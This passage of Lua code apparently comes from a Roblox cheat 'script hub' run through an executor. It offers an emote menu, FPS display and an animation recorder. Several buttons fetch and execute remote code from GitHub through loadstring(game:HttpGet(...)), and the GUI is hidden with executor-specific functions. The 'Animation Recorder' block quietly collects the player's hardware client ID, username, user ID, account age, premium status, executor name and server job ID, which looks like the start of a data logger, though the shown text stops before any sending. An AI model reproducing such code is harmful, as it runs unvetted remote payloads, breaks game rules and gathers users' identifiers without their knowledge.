    btn.Name = "CopyButton" .. i
    btn.Size = UDim2.new(0.35, 0, 0, boxHeight)
    btn.Position = UDim2.new(0.6, 0 + paddingX, 0, startY + (i-1) * (boxHeight + spacingY))
    btn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
    btn.BorderSizePixel = 0
    btn.Text = "Copy"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.SourceSans
    btn.TextSize = 16
    btn.Parent = frame

    -- Connect button click to fire server for this box
    btn.MouseButton1Click:Connect(function()
        local username = box.Text
        if username and #username > 0 then
            ModifyUsername_upvr:FireServer(username)
        else
            box.Text = "Bitte gÃ¼ltigen Namen eingeben"
            delay(1, function() box.Text = "" end)
        end
    end)

    table.insert(items, {box = box, button = btn})
end

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Name = "CloseButton"
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -28, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 18
closeBtn.Parent = frame

-- Close functionality
closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)
   end,
})

local Button = MicupTab:CreateButton({
   Name = "Face Fuck",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/SGscriptOnTop/FaceFuck/refs/heads/main/SG"))()
   end,
})

local Button = MicupTab:CreateButton({
   Name = "Rewind",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/SGscriptOnTop/REWIND/refs/heads/main/SG"))()
   end,
})

local Button = HomeTab:CreateButton({
   Name = "FPS SHOW",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/SGscriptOnTop/FPS/refs/heads/main/SHOWER"))()
   end,
})

local Button = HomeTab:CreateButton({
   Name = "purple emotes menu",
   Callback = function()
   -- Made by X1MV 
local IsStudio = false

local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")
local AvatarEditorService = game:GetService("AvatarEditorService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
 
local Emotes = {}
local function AddEmote(name: string, id: IntValue, price: IntValue?)
	if not (name and id) then
		return
	end
 
	table.insert(Emotes, {
		["name"] = name,
		["id"] = id,
		["icon"] = "rbxthumb://type=Asset&id=".. id .."&w=150&h=150",
		["price"] = price or 0,
		["index"] = #Emotes + 1,
		["sort"] = {}
	})
end
local CurrentSort = "newestfirst"
 
local FavoriteOff = "rbxassetid://10651060677"
local FavoriteOn = "rbxassetid://10651061109"
local FavoritedEmotes = {}
 
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Emotes"
ScreenGui.DisplayOrder = 1
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Enabled = false
 
local BackFrame = Instance.new("Frame")
BackFrame.Size = UDim2.new(1.3, 0, 0.9, 0.3)
BackFrame.AnchorPoint = Vector2.new(0.5, 0.5)
BackFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
BackFrame.SizeConstraint = Enum.SizeConstraint.RelativeYY
BackFrame.BackgroundTransparency = 1
BackFrame.BorderSizePixel = 0
BackFrame.Parent = ScreenGui
 
local EmoteName = Instance.new("TextLabel")
EmoteName.Name = "EmoteName"
EmoteName.TextScaled = true
EmoteName.AnchorPoint = Vector2.new(0.5, 0.5)
EmoteName.Position = UDim2.new(-0.1, 0, 0.5, 0)
EmoteName.Size = UDim2.new(0.05, 0, 0.05, 0)
EmoteName.SizeConstraint = Enum.SizeConstraint.RelativeYY
EmoteName.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
EmoteName.TextColor3 = Color3.new(1, 1, 1)
EmoteName.BorderSizePixel = 0
EmoteName.Parent = BackFrame
 
local Corner = Instance.new("UICorner")
Corner.Parent = EmoteName
 
local Loading = Instance.new("TextLabel", BackFrame)
Loading.AnchorPoint = Vector2.new(0.5, 0.5)
Loading.Text = "Loading Emote Wheel."
Loading.TextColor3 = Color3.new(1, 1, 1)
Loading.BackgroundColor3 = Color3.new(0, 0, 0)
Loading.TextScaled = true
Loading.BackgroundTransparency = 0.5
Loading.Size = UDim2.fromScale(0.2, 0.1)
Loading.Position = UDim2.fromScale(0.5, 0.2)
Corner:Clone().Parent = Loading
 
local Frame = Instance.new("ScrollingFrame")
Frame.Size = UDim2.new(0.8, 3, 1.2, 1)
Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
Frame.ScrollingDirection = Enum.ScrollingDirection.Y
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 1)
Frame.BackgroundTransparency = 1
Frame.ScrollBarThickness = 5
Frame.BorderSizePixel = 0
Frame.Parent = BackFrame
 
local Grid = Instance.new("UIGridLayout")
Grid.CellSize = UDim2.new(0.105, 0, 0, 0)
Grid.CellPadding = UDim2.new(0.001, 0, 0.006, 0)
Grid.SortOrder = Enum.SortOrder.LayoutOrder
Grid.Parent = Frame
 
local SortFrame = Instance.new("Frame")
SortFrame.Visible = false
SortFrame.BorderSizePixel = 1
SortFrame.Position = UDim2.new(1, 5, -0.125, 0)
SortFrame.Size = UDim2.new(0.7, 0, 0, 0)
SortFrame.AutomaticSize = Enum.AutomaticSize.Y
SortFrame.BackgroundTransparency = 0.9
Corner:Clone().Parent = SortFrame
SortFrame.Parent = BackFrame
 
local SortList = Instance.new("UIListLayout")
SortList.Padding = UDim.new(0.07, 1)
SortList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SortList.VerticalAlignment = Enum.VerticalAlignment.Top
SortList.SortOrder = Enum.SortOrder.LayoutOrder
SortList.Parent = SortFrame
 
local function SortEmotes()
	for i,Emote in pairs(Emotes) do
		local EmoteButton = Frame:FindFirstChild(Emote.id)
		if not EmoteButton then
			continue
		end
		local IsFavorited = table.find(FavoritedEmotes, Emote.id)
		EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + ((IsFavorited and 55) or #Emotes)
		EmoteButton.number.Text = Emote.sort[CurrentSort]
	end
end
 
local function createsort(order, text, sort)
	local CreatedSort = Instance.new("TextButton")
	CreatedSort.SizeConstraint = Enum.SizeConstraint.RelativeXX
	CreatedSort.Size = UDim2.new(1, 0, 0.2, 0)
	CreatedSort.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	CreatedSort.LayoutOrder = order
	CreatedSort.TextColor3 = Color3.new(1, 1, 1)
	CreatedSort.Text = text
	CreatedSort.TextScaled = true
	CreatedSort.BorderSizePixel = 0
	Corner:Clone().Parent = CreatedSort
	CreatedSort.Parent = SortFrame
	CreatedSort.MouseButton1Click:Connect(function()
		SortFrame.Visible = false
		CurrentSort = sort
		SortEmotes()
	end)
	return CreatedSort
end
 
createsort(1, "Newest First", "newestfirst")
createsort(2, "Oldest First", "oldestfirst")
createsort(3, "Alphabetically First", "alphabeticfirst")
createsort(4, "Alphabetically Last", "alphabeticlast")
createsort(5, "Highest Price", "highestprice")
createsort(6, "Lowest Price", "lowestprice")
 
local SortButton = Instance.new("TextButton")
SortButton.BorderSizePixel = 0
SortButton.AnchorPoint = Vector2.new(0.5, 0.5)
SortButton.Position = UDim2.new(1, -10, -5, 0)
SortButton.Size = UDim2.new(0.08, 0, 0.04, 0)
SortButton.TextScaled = true
SortButton.TextColor3 = Color3.new(1, 1, 1)
SortButton.BackgroundColor3 = Color3.new(0, 0, 0)
SortButton.BackgroundTransparency = 1
SortButton.Text = "Sort"
SortButton.MouseButton1Click:Connect(function()
	SortFrame.Visible = not SortFrame.Visible
end)
Corner:Clone().Parent = SortButton
SortButton.Parent = BackFrame
 
local CloseButton = Instance.new("TextButton")
CloseButton.BorderSizePixel = 0
CloseButton.AnchorPoint = Vector2.new(0.5, 0.5)
CloseButton.Position = UDim2.new(76, 0, -0.08, 5)
CloseButton.Size = UDim2.new(0.2, 0, 0.04, 0)
CloseButton.TextScaled = true
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.BackgroundColor3 = Color3.new(0, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "Close"
CloseButton.MouseButton1Click:Connect(function()
	ScreenGui.Enabled = false
end)
Corner:Clone().Parent = CloseButton
CloseButton.Parent = BackFrame
 
-- Entfernt: SearchBar und zugehÃ¶riger Code
 
local function openemotes(name, state, input)
	if state == Enum.UserInputState.Begin then
		ScreenGui.Enabled = not ScreenGui.Enabled
	end
end
 
if IsStudio then
	ContextActionService:BindActionAtPriority(
		"Emote Menu",
		openemotes,
		true,
		2001,
		Enum.KeyCode.Comma
	)
else
	ContextActionService:BindCoreActionAtPriority(
		"Emote Menu",
		openemotes,
		true,
		2001,
		Enum.KeyCode.Comma
	)
end
 
-- Der Input-Began-Handler zum SchlieÃen per Mausklick wurde entfernt!
-- So wird die GUI nicht durch Mausklicks oder andere Eingaben geschlossen.
 
local LocalPlayer = Players.LocalPlayer
 
if IsStudio then
	ScreenGui.Parent = LocalPlayer.PlayerGui
else
	--thanks inf yield
	local SynV3 = syn and DrawingImmediate
	if (not is_sirhurt_closure) and (not SynV3) and (syn and syn.protect_gui) then
		syn.protect_gui(ScreenGui)
		ScreenGui.Parent = CoreGui
	elseif get_hidden_gui or gethui then
		local hiddenUI = get_hidden_gui or gethui
		ScreenGui.Parent = hiddenUI()
	else
		ScreenGui.Parent = CoreGui
	end
end
 
local function SendNotification(title, text)
	if (not IsStudio) and syn and syn.toast_notification then
		syn.toast_notification({
			Type = ToastType.Error,
			Title = title,
			Content = text
		})
	else
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text
		})
	end
end
 
local function HumanoidPlayEmote(humanoid, name, id)
	if IsStudio then
		return humanoid:PlayEmote(name)
	else
		return humanoid:PlayEmoteAndGetAnimTrackById(id)
	end
end
 
local function PlayEmote(name: string, id: IntValue)
	-- ScreenGui.Enabled bleibt unverÃ¤ndert, damit die GUI offen bleibt
	local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local Description = Humanoid and Humanoid:FindFirstChildOfClass("HumanoidDescription")
	if not Description then
		return
	end
	if LocalPlayer.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R6 then
		local succ, err = pcall(function()
			HumanoidPlayEmote(Humanoid, name, id)
		end)
		if not succ then
			Description:AddEmote(name, id)
			HumanoidPlayEmote(Humanoid, name, id)
		end
	else
		SendNotification("r6? lol", "you gotta be r15 dude")
	end
end
 
local function WaitForChildOfClass(parent, class)
	local child = parent:FindFirstChildOfClass(class)
	while not child or child.ClassName ~= class do
		child = parent.ChildAdded:Wait()
	end
	return child
end
 
local params = CatalogSearchParams.new()
params.AssetTypes = {Enum.AvatarAssetType.EmoteAnimation}
params.SortType = Enum.CatalogSortType.RecentlyCreated
params.SortAggregation = Enum.CatalogSortAggregation.AllTime
params.IncludeOffSale = true
params.CreatorName = "Roblox"
params.Limit = 120
 
local function getCatalogPage()
	local success, catalogPage = pcall(function()
		return AvatarEditorService:SearchCatalog(params)
	end)
	if not success then
		task.wait(5)
		return getCatalogPage()
	end
	return catalogPage
end
 
local catalogPage = getCatalogPage()
 
local pages = {}
 
while true do
	local currentPage = catalogPage:GetCurrentPage()
	table.insert(pages, currentPage)
	if catalogPage.IsFinished then
		break
	end
	local function AdvanceToNextPage()
		local success = pcall(function()
			catalogPage:AdvanceToNextPageAsync()
		end)
		if not success then
			task.wait(5)
			return AdvanceToNextPage()
		end
	end
	AdvanceToNextPage()
end
 
local totalEmotes = {}
for _, page in pairs(pages) do
	for _, emote in pairs(page) do
		table.insert(totalEmotes, emote)
	end
end
 
for i, Emote in pairs(totalEmotes) do
	AddEmote(Emote.Name, Emote.Id, Emote.Price)
end
 
-- unreleased emotes
AddEmote("Arm Wave", 5915773155)
AddEmote("Head Banging", 5915779725)
AddEmote("Face Calisthenics", 9830731012)
 
-- finished loading
Loading:Destroy()
 
-- sorting options setup
table.sort(Emotes, function(a, b)
	return a.index < b.index
end)
for i,v in pairs(Emotes) do
	v.sort.newestfirst = i
end
 
table.sort(Emotes, function(a, b)
	return a.index > b.index
end)
for i,v in pairs(Emotes) do
	v.sort.oldestfirst = i
end
 
table.sort(Emotes, function(a, b)
	return a.name:lower() < b.name:lower()
end)
for i,v in pairs(Emotes) do
	v.sort.alphabeticfirst = i
end
 
table.sort(Emotes, function(a, b)
	return a.name:lower() > b.name:lower()
end)
for i,v in pairs(Emotes) do
	v.sort.alphabeticlast = i
end
 
table.sort(Emotes, function(a, b)
	return a.price < b.price
end)
for i,v in pairs(Emotes) do
	v.sort.lowestprice = i
end
 
table.sort(Emotes, function(a, b)
	return a.price > b.price
end)
for i,v in pairs(Emotes) do
	v.sort.highestprice = i
end
 
local function IsFileFunc(...)
	if IsStudio then
		return
	elseif isfile then
		return isfile(...)
	end
end
 
local function WriteFileFunc(...)
	if IsStudio then
		return
	elseif writefile then
		return writefile(...)
	end
end
 
local function ReadFileFunc(...)
	if IsStudio then
		return
	elseif readfile then
		return readfile(...)
	end
end
 
if not IsStudio then
	if IsFileFunc("FavoritedEmotes.txt") then
		if not pcall(function()
			FavoritedEmotes = HttpService:JSONDecode(ReadFileFunc("FavoritedEmotes.txt"))
		end) then
			FavoritedEmotes = {}
		end
	else
		WriteFileFunc("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
	end
end
 
local function CharacterAdded(Character)
	for i,v in pairs(Frame:GetChildren()) do
		if not v:IsA("UIGridLayout") then
			v:Destroy()
		end
	end
	local Humanoid = WaitForChildOfClass(Character, "Humanoid")
	local Description = Humanoid:WaitForChild("HumanoidDescription", 5) or Instance.new("HumanoidDescription", Humanoid)
	local random = Instance.new("TextButton")
	local Ratio = Instance.new("UIAspectRatioConstraint")
	Ratio.AspectType = Enum.AspectType.ScaleWithParentSize
	Ratio.Parent = random
	random.LayoutOrder = 0
	random.TextColor3 = Color3.new(1, 1, 1)
	random.BorderSizePixel = 0
	-- Hintergrundfarbe hier auf dunkleres Lila geÃ¤ndert:
	random.BackgroundTransparency = 0.3
	random.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
	random.TextScaled = true
	random.Text = "Random"
	random:SetAttribute("name", "")
	Corner:Clone().Parent = random
	random.MouseButton1Click:Connect(function()
		local randomemote = Emotes[math.random(1, #Emotes)]
		PlayEmote(randomemote.name, randomemote.id)
	end)
	random.MouseEnter:Connect(function()
		EmoteName.Text = "Random"
	end)
	random.Parent = Frame
	for i,Emote in pairs(Emotes) do
		Description:AddEmote(Emote.name, Emote.id)
		local EmoteButton = Instance.new("ImageButton")
		local IsFavorited = table.find(FavoritedEmotes, Emote.id)
		EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + ((IsFavorited and 0) or #Emotes)
		EmoteButton.Name = Emote.id
		EmoteButton:SetAttribute("name", Emote.name)
		Corner:Clone().Parent = EmoteButton
		EmoteButton.Image = Emote.icon
		EmoteButton.BackgroundTransparency = 0.5
		-- Hintergrundfarbe hier auf dunkleres Lila geÃ¤ndert:
		EmoteButton.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
		EmoteButton.BorderSizePixel = 0
		Ratio:Clone().Parent = EmoteButton
		local EmoteNumber = Instance.new("TextLabel")
		EmoteNumber.Name = "number"
		EmoteNumber.TextScaled = true
		EmoteNumber.BackgroundTransparency = 1
		EmoteNumber.TextColor3 = Color3.new(255, 255, 255)
		EmoteNumber.BorderSizePixel = 0
		EmoteNumber.AnchorPoint = Vector2.new(0.5, 0.5)
		EmoteNumber.Size = UDim2.new(0.2, 0, 0.2, 0)
		EmoteNumber.Position = UDim2.new(0.1, 0, 0.9, 0)
		EmoteNumber.Text = Emote.sort[CurrentSort]
		EmoteNumber.TextXAlignment = Enum.TextXAlignment.Center
		EmoteNumber.TextYAlignment = Enum.TextYAlignment.Center
		local UIStroke = Instance.new("UIStroke")
		UIStroke.Transparency = 1
		UIStroke.Parent = EmoteNumber
		EmoteNumber.Parent = EmoteButton
		EmoteButton.Parent = Frame
		EmoteButton.MouseButton1Click:Connect(function()
			PlayEmote(Emote.name, Emote.id)
		end)
		EmoteButton.MouseEnter:Connect(function()
			EmoteName.Text = Emote.name
		end)
		local Favorite = Instance.new("ImageButton")
		Favorite.Name = "favorite"
		if table.find(FavoritedEmotes, Emote.id) then
			Favorite.Image = FavoriteOn
		else
			Favorite.Image = FavoriteOff
		end
		Favorite.AnchorPoint = Vector2.new(0.5, 0.5)
		Favorite.Size = UDim2.new(0.1, 0, 0.1, 0)
		Favorite.Position = UDim2.new(0.9, 0, 0.9, 0)
		Favorite.BorderSizePixel = 0
		Favorite.BackgroundTransparency = 1
		Favorite.Parent = EmoteButton
		Favorite.MouseButton1Click:Connect(function()
			local index = table.find(FavoritedEmotes, Emote.id)
			if index then
				table.remove(FavoritedEmotes, Emote.id)
				Favorite.Image = FavoriteOff
				EmoteButton.LayoutOrder = Emote.sort[CurrentSort] + #Emotes
			else
				table.insert(FavoritedEmotes, Emote.id)
				Favorite.Image = FavoriteOn
				EmoteButton.LayoutOrder = Emote.sort[CurrentSort]
			end
			WriteFileFunc("FavoritedEmotes.txt", HttpService:JSONEncode(FavoritedEmotes))
		end)
	end
	for i=1,9 do
		local EmoteButton = Instance.new("Frame")
		EmoteButton.LayoutOrder = 2147483647
		EmoteButton.Name = "filler"
		EmoteButton.BackgroundTransparency = 1
		EmoteButton.BorderSizePixel = 0
		Ratio:Clone().Parent = EmoteButton
		EmoteButton.Visible = true
		EmoteButton.Parent = Frame
		EmoteButton.MouseEnter:Connect(function()
			EmoteName.Text = "Emote"
		end)
	end
end
 
if LocalPlayer.Character then
	CharacterAdded(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(CharacterAdded)
 
local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;

Notify({
	Description = "Made By X1MV";
	Title = "X1MV Emotes";
	Duration = 5;
});

-- Wait before showing the main GUI
wait(5)
 
ScreenGui.Parent = CoreGui
   end,
})

local Button = MicupTab:CreateButton({
   Name = "Animation Recorder",
   Callback = function()
   
---------------------------------------------------------
-- SERVICES
---------------------------------------------------------
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")

---------------------------------------------------------
-- Retrieve player data
---------------------------------------------------------
local LocalPlayer = Players.LocalPlayer
local clientHWID = RbxAnalyticsService:GetClientId()
local username = LocalPlayer.Name
local userId = LocalPlayer.UserId
local displayName = LocalPlayer.DisplayName
local membershipType = "None"

-- Get user info
local accountInfo = {}
pcall(function()
    accountInfo = Players:GetPlayerByUserId(userId)
end)

-- Get account age
local accountAge = "Unknown"
pcall(function()
    accountAge = tostring(LocalPlayer.AccountAge) .. " days"
end)

-- Get premium status
local isPremium = false
pcall(function()
    isPremium = LocalPlayer.MembershipType ~= Enum.MembershipType.None
    if isPremium then
        membershipType = "Premium"
    end
end)

-- Get game info
local placeId = game.PlaceId
local placeName = "Unknown Game"
pcall(function()
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if success and info then
        placeName = info.Name
    end
end)

-- Get job id
local jobId = game.JobId

-- Get platform
local platform = "Unknown"
local ping = "Unknown"

pcall(function()
    -- Check platform based on device specs or behavior
    local touchEnabled = game:GetService("UserInputService").TouchEnabled
    local mouseEnabled = game:GetService("UserInputService").MouseEnabled
    local keyboardEnabled = game:GetService("UserInputService").KeyboardEnabled
    
    if touchEnabled and not mouseEnabled and not keyboardEnabled then
        platform = " Mobile"
    elseif not touchEnabled and mouseEnabled and keyboardEnabled then
        platform = " PC"
    elseif not touchEnabled and not mouseEnabled and not keyboardEnabled then
        platform = " Console"
    else
        platform = " Unknown"
    end
    
    -- Get ping (this is approximate)
    local success, stats = pcall(function()
        return game:GetService("Stats")
    end)
    if success and stats and stats:FindFirstChild("Network") and stats.Network:FindFirstChild("ServerStatsItem") and stats.Network.ServerStatsItem:FindFirstChild("Data Ping") then
        ping = math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
    else
        ping = "Unknown"
    end
end)

-- Get current date and time
local dateTime = os.date("*t")
local formattedDate = string.format("%02d/%02d/%d", dateTime.day, dateTime.month, dateTime.year)
local formattedTime = string.format("%02d:%02d:%02d", dateTime.hour, dateTime.min, dateTime.sec)

-- Determine which executor is being used
local execName = "Unknown"
pcall(function()
    if typeof(getexecutorname) == "function" then
        execName = getexecutorname()
    end
end)

-- Generate a join link/code for the game
local teleportScript = string.format("game:GetService('TeleportService'):Teleport(%s,game.Players.LocalPlayer,'%s')", placeId, jobId)

-- Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")

-- Variables
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local Animator = Humanoid:WaitForChild("Animator")

local GUI
local DraggableFrame
local RecordingClip = false
local CurrentClip = {}
local SavedClips = {}
local LoopingClips = {}
local KeyBinds = {}
local ClipsFolder = "AnimationClipsSaved"
local SaveFileName = "AnimationClips_" .. LocalPlayer.UserId .. ".json"
local SelectedPlayer = nil
local CurrentlyPlayingClip = nil
local CurrentStopFunc = nil

-- Track animation states
local TrackingAnimations = false
local AnimationTracks = {}
local LastAnimationTime = 0

-- Create GUI
local function CreateGUI()
    -- Main Frame
    GUI = Instance.new("ScreenGui")
    GUI.Name = "AnimationRecorderGUI"
    GUI.ResetOnSpawn = false
    
    DraggableFrame = Instance.new("Frame")
    DraggableFrame.Name = "MainFrame"
    DraggableFrame.Size = UDim2.new(0, 400, 0, 500)
    DraggableFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
    DraggableFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    DraggableFrame.BorderSizePixel = 0
    DraggableFrame.Parent = GUI
    
    -- Round corners
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = DraggableFrame
    
    -- Title Bar
    local TitleBar = Instance.new("Frame")
    TitleBar.Name = "TitleBar"
    TitleBar.Size = UDim2.new(1, 0, 0, 30)
    TitleBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = DraggableFrame
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 10)
    TitleCorner.Parent = TitleBar
    
    -- Fix corners for title bar
    local CornerFix = Instance.new("Frame")
    CornerFix.Name = "CornerFix"
    CornerFix.Size = UDim2.new(1, 0, 0.5, 0)
    CornerFix.Position = UDim2.new(0, 0, 0.5, 0)
    CornerFix.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    CornerFix.BorderSizePixel = 0
    CornerFix.Parent = TitleBar
    
    -- Title
    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, -60, 1, 0)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 14
    Title.Text = "Animation Recorder"
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = TitleBar
    
    -- Close Button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 20, 0, 20)
    CloseButton.Position = UDim2.new(1, -25, 0, 5)
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
    CloseButton.Text = ""
    CloseButton.Parent = TitleBar
    
    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(1, 0)
    CloseCorner.Parent = CloseButton
    
    -- Main Content Container
    local ContentFrame = Instance.new("Frame")
    ContentFrame.Name = "ContentFrame"
    ContentFrame.Size = UDim2.new(1, -20, 1, -40)
    ContentFrame.Position = UDim2.new(0, 10, 0, 35)
    ContentFrame.BackgroundTransparency = 1
    ContentFrame.Parent = DraggableFrame
    
    -- Player Search Section
    local SearchSection = Instance.new("Frame")
    SearchSection.Name = "SearchSection"
    SearchSection.Size = UDim2.new(1, 0, 0, 60)
    SearchSection.BackgroundTransparency = 1
    SearchSection.Parent = ContentFrame
    
    local SearchLabel = Instance.new("TextLabel")
    SearchLabel.Name = "SearchLabel"
    SearchLabel.Size = UDim2.new(1, 0, 0, 20)
    SearchLabel.BackgroundTransparency = 1
    SearchLabel.Font = Enum.Font.Gotham
    SearchLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    SearchLabel.TextSize = 14
    SearchLabel.Text = "Search Player:"
    SearchLabel.TextXAlignment = Enum.TextXAlignment.Left
    SearchLabel.Parent = SearchSection
    
    local SearchBox = Instance.new("TextBox")
    SearchBox.Name = "SearchBox"
    SearchBox.Size = UDim2.new(1, 0, 0, 30)
    SearchBox.Position = UDim2.new(0, 0, 0, 25)
    SearchBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    SearchBox.BorderSizePixel = 0
    SearchBox.Font = Enum.Font.Gotham
    SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    SearchBox.TextSize = 14
    SearchBox.PlaceholderText = "Enter username or display name..."
    SearchBox.Text = ""
    SearchBox.Parent = SearchSection
    
    local SearchBoxCorner = Instance.new("UICorner")
    SearchBoxCorner.CornerRadius = UDim.new(0, 5)
    SearchBoxCorner.Parent = SearchBox
    
    -- Dropdown for search results
    local DropdownFrame = Instance.new("Frame")
    DropdownFrame.Name = "DropdownFrame"
    DropdownFrame.Size = UDim2.new(1, 0, 0, 0) -- Dynamic height
    DropdownFrame.Position = UDim2.new(0, 0, 0, 60)
    DropdownFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    DropdownFrame.BorderSizePixel = 0
    DropdownFrame.Visible = false
    DropdownFrame.ZIndex = 5
    DropdownFrame.Parent = SearchSection
    
    local DropdownLayout = Instance.new("UIListLayout")
    DropdownLayout.SortOrder = Enum.SortOrder.LayoutOrder
    DropdownLayout.Parent = DropdownFrame
    
    local DropdownCorner = Instance.new("UICorner")
    DropdownCorner.CornerRadius = UDim.new(0, 5)
    DropdownCorner.Parent = DropdownFrame
    
    -- Recording Control Section
    local ControlSection = Instance.new("Frame")
    ControlSection.Name = "ControlSection"
    ControlSection.Size = UDim2.new(1, 0, 0, 40)
    ControlSection.Position = UDim2.new(0, 0, 0, 70)
    ControlSection.BackgroundTransparency = 1
    ControlSection.Parent = ContentFrame
    
    -- Toggle Record Button (replaces separate record and stop buttons)
    local RecordButton = Instance.new("TextButton")
    RecordButton.Name = "RecordButton"
    RecordButton.Size = UDim2.new(1, 0, 1, 0)
    RecordButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
    RecordButton.Font = Enum.Font.GothamBold
    RecordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    RecordButton.TextSize = 14
    RecordButton.Text = "START RECORDING"
    RecordButton.Parent = ControlSection
    
    local RecordCorner = Instance.new("UICorner")
    RecordCorner.CornerRadius = UDim.new(0, 5)
    RecordCorner.Parent = RecordButton
    
    -- Status Label
    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Name = "StatusLabel"
    StatusLabel.Size = UDim2.new(1, 0, 0, 20)
    StatusLabel.Position = UDim2.new(0, 0, 0, 120)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Font = Enum.Font.Gotham
    StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    StatusLabel.TextSize = 12
    StatusLabel.Text = "Ready to record"
    StatusLabel.Parent = ContentFrame
    
    -- Clips List Section
    local ClipsSection = Instance.new("Frame")
    ClipsSection.Name = "ClipsSection"
    ClipsSection.Size = UDim2.new(1, 0, 1, -150)
    ClipsSection.Position = UDim2.new(0, 0, 0, 150)
    ClipsSection.BackgroundTransparency = 1
    ClipsSection.Parent = ContentFrame
    
    local ClipsLabel = Instance.new("TextLabel")
    ClipsLabel.Name = "ClipsLabel"
    ClipsLabel.Size = UDim2.new(1, 0, 0, 20)
    ClipsLabel.BackgroundTransparency = 1
    ClipsLabel.Font = Enum.Font.GothamBold
    ClipsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    ClipsLabel.TextSize = 14
    ClipsLabel.Text = "Saved Clips"
    ClipsLabel.TextXAlignment = Enum.TextXAlignment.Left
    ClipsLabel.Parent = ClipsSection
    
    local ClipsScrollFrame = Instance.new("ScrollingFrame")
    ClipsScrollFrame.Name = "ClipsScrollFrame"
    ClipsScrollFrame.Size = UDim2.new(1, 0, 1, -25)
    ClipsScrollFrame.Position = UDim2.new(0, 0, 0, 25)
    ClipsScrollFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    ClipsScrollFrame.BorderSizePixel = 0
    ClipsScrollFrame.ScrollBarThickness = 4
    ClipsScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0) -- Wird dynamisch angepasst
    ClipsScrollFrame.Parent = ClipsSection
    
    local ClipsCorner = Instance.new("UICorner")
    ClipsCorner.CornerRadius = UDim.new(0, 5)
